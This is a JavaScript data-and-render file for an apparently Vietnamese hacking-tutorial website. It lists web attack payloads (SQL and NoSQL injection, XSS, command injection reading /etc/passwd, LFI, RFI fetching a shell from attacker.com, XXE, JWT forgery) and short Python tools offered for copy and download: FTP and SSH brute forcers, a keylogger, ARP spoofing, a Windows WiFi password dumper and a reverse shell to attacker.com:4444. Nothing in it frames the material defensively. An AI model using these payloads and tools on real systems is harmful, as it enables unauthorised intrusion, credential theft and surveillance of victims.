// ================== POSTS DATA ==================
// post.js
const posts = {
  news: [
    {
      title: "Anonymous trở lại",
      content: "Nhóm hacker Anonymous vừa công bố chiến dịch mới nhằm vào các tập đoàn lớn.",
      code: "https://anonymous.com/news"
    },
    {
      title: "Rò rỉ dữ liệu 1 triệu tài khoản",
      content: "Một cơ sở dữ liệu hơn 1 triệu tài khoản bị rò rỉ trên darkweb.",
      code: "https://leakcheck.io"
    }
  ],

  tutorials: [
    {
      title: "SQL Injection cơ bản",
      content: "Cách khai thác SQL Injection trên form đăng nhập không an toàn.",
      code: `' OR '1'='1 --`
    },
    {
      title: "SQL Injection nâng cao",
      content: "Sử dụng UNION để trích xuất dữ liệu từ bảng users.",
      code: `' UNION SELECT null, username, password FROM users --`
    },
    {
      title: "XSS cơ bản",
      content: "Cách chèn JavaScript vào input để popup cảnh báo.",
      code: `<script>alert('XSS')</script>`
    },
    {
      title: "Stored XSS",
      content: "XSS được lưu lại trong database và hiển thị cho tất cả người dùng.",
      code: `<img src=x onerror=alert('Hacked!')>`
    },
    {
      title: "Reflected XSS",
      content: "XSS thông qua URL hoặc query string.",
      code: `http://victim.com/page?q=<script>alert(1)</script>`
    },
    {
      title: "Command Injection",
      content: "Inject lệnh hệ thống vào parameter không kiểm soát.",
      code: `; cat /etc/passwd`
    },
    {
      title: "LFI (Local File Inclusion)",
      content: "Khai thác lỗi include file cục bộ.",
      code: `http://site.com/index.php?page=../../etc/passwd`
    },
    {
      title: "RFI (Remote File Inclusion)",
      content: "Chèn file từ server bên ngoài.",
      code: `http://site.com/index.php?page=http://attacker.com/shell.txt`
    },
    {
      title: "CSRF cơ bản",
      content: "Tạo form giả mạo để nạn nhân gửi request không mong muốn.",
      code: `<form action="http://victim.com/delete" method="POST"><input type="submit"></form>`
    },
    {
      title: "XXE Injection",
      content: "Khai thác XML External Entity để đọc file nhạy cảm.",
      code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
    },
    {
      title: "Bypass Login Form",
      content: "Payload đơn giản để qua mặt xác thực yếu.",
      code: `admin'--`
    },
    {
      title: "NoSQL Injection",
      content: "Tấn công database MongoDB không an toàn.",
      code: `{ "username": { "$ne": null }, "password": { "$ne": null } }`
    },
    {
      title: "JWT Token Forgery",
      content: "Thay đổi thuật toán để giả mạo token.",
      code: `{"alg":"none","typ":"JWT"}`
    },
    {
      title: "IDOR (Insecure Direct Object Reference)",
      content: "Truy cập tài nguyên bằng cách thay đổi ID.",
      code: `http://site.com/profile?id=1002`
    },
    {
      title: "Path Traversal",
      content: "Đọc file nhạy cảm bằng ../",
      code: `http://victim.com/getfile?name=../../../../etc/passwd`
    }
  ],

  tools: [
    {
      title: "Port Scanner",
      content: "Tool Python scan port cơ bản.",
      code: `import socket
for port in range(1,1000):
    s=socket.socket(); s.settimeout(0.5)
    try: s.connect(("127.0.0.1",port)); print("Open:",port)
    except: pass`,
      download: "https://example.com/port_scanner.py"
    },
    {
      title: "Subdomain Finder",
      content: "Script tìm subdomain từ wordlist.",
      code: `import requests
domains=["www","mail","test"]
for d in domains:
    url=f"http://{d}.target.com"
    try: requests.get(url); print("Found:",url)
    except: pass`,
      download: "https://example.com/subfinder.py"
    },
    {
      title: "Brute Force FTP",
      content: "Brute force login FTP với Python.",
      code: `import ftplib
server="127.0.0.1"
user="admin"
for pwd in ["123456","password"]:
    try:
        ftp=ftplib.FTP(server)
        ftp.login(user,pwd)
        print("Password:",pwd)
        break
    except: pass`,
      download: "https://example.com/ftp_brute.py"
    },
    {
      title: "SSH Brute Force",
      content: "Brute force SSH login.",
      code: `import paramiko
for pwd in ["123456","root"]:
    ssh=paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect("127.0.0.1", username="root", password=pwd)
        print("Found:",pwd); break
    except: pass`,
      download: "https://example.com/ssh_brute.py"
    },
    {
      title: "Simple Keylogger",
      content: "Keylogger thu thập phím bấm.",
      code: `from pynput import keyboard
def on_press(key): print("Key:",key)
with keyboard.Listener(on_press=on_press) as l: l.join()`,
      download: "https://example.com/keylogger.py"
    },
    {
      title: "Basic Packet Sniffer",
      content: "Tool sniff packet trên mạng LAN.",
      code: `import socket
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IP)
s.bind(("192.168.1.5",0)); print("Sniffing...")`,
      download: "https://example.com/sniffer.py"
    },
    {
      title: "HTTP Header Grabber",
      content: "Tool lấy thông tin header từ website.",
      code: `import requests
url="http://target.com"
r=requests.get(url)
print(r.headers)`,
      download: "https://example.com/header_grabber.py"
    },
    {
      title: "Simple Web Crawler",
      content: "Tool crawl URL từ website.",
      code: `import requests, re
r=requests.get("http://target.com")
for url in re.findall('href="(http.*?)"',r.text): print(url)`,
      download: "https://example.com/crawler.py"
    },
    {
      title: "Directory Bruteforce",
      content: "Tìm thư mục ẩn với wordlist.",
      code: `import requests
for d in ["admin","backup","login"]:
    url="http://target.com/"+d
    if requests.get(url).status_code==200: print("Found:",url)`,
      download: "https://example.com/dirbf.py"
    },
    {
      title: "Simple Reverse Shell",
      content: "Python reverse shell.",
      code: `import socket,os,pty
s=socket.socket(); s.connect(("attacker.com",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")`,
      download: "https://example.com/revshell.py"
    },
    {
      title: "ARP Spoofing",
      content: "Tool spoof ARP để MITM.",
      code: `from scapy.all import *
send(ARP(op=2,pdst="192.168.1.1",hwdst="xx:xx:xx:xx",psrc="192.168.1.100"))`,
      download: "https://example.com/arpspoof.py"
    },
    {
      title: "DNS Lookup",
      content: "Tool tra cứu DNS record.",
      code: `import socket
print(socket.gethostbyname("example.com"))`,
      download: "https://example.com/dnslookup.py"
    },
    {
      title: "Hash Cracker",
      content: "Crack MD5 hash bằng wordlist.",
      code: `import hashlib
h="5d41402abc4b2a76b9719d911017c592"
for w in ["hello","world"]:
    if hashlib.md5(w.encode()).hexdigest()==h: print("Found:",w)`,
      download: "https://example.com/hashcrack.py"
    },
    {
      title: "WiFi Password Stealer",
      content: "Dump WiFi password trong Windows.",
      code: `import os
os.system("netsh wlan show profile name=wifi key=clear")`,
      download: "https://example.com/wifi_dump.py"
    },
    {
      title: "Screenshot Grabber",
      content: "Tool chụp màn hình tự động.",
      code: `import pyautogui
img=pyautogui.screenshot()
img.save("screen.png")`,
      download: "https://example.com/screenshot.py"
    }
  ]
};



// ================== RENDER POSTS ==================
function renderPosts() {
  // News
  const newsContainer = document.getElementById("news");
  posts.news.forEach(post => {
    newsContainer.innerHTML += `
      <div class="card">
        <h2>📡 ${post.title}</h2>
        <p>${post.content}</p>
        <a href="${post.link}" target="_blank">
          <button class="btn read-btn">🔗 Read More</button>
        </a>
      </div>`;
  });

  // Tutorials
  const tutContainer = document.getElementById("tutorials");
  posts.tutorials.forEach(post => {
    tutContainer.innerHTML += `
      <div class="card">
        <h2>💻 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
      </div>`;
  });

  // Tools
  const toolContainer = document.getElementById("tools");
  posts.tools.forEach(post => {
    toolContainer.innerHTML += `
      <div class="card">
        <h2>🛠 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
        <a href="${post.download}" download>
          <button class="btn download-btn">⬇ Download</button>
        </a>
      </div>`;
  });
}

// ================== FUNCTIONS ==================
function copyCode(code) {
  navigator.clipboard.writeText(code).then(() => {
    alert("✅ Code copied to clipboard!");
  });
}

// Run
document.addEventListener("DOMContentLoaded", renderPosts);
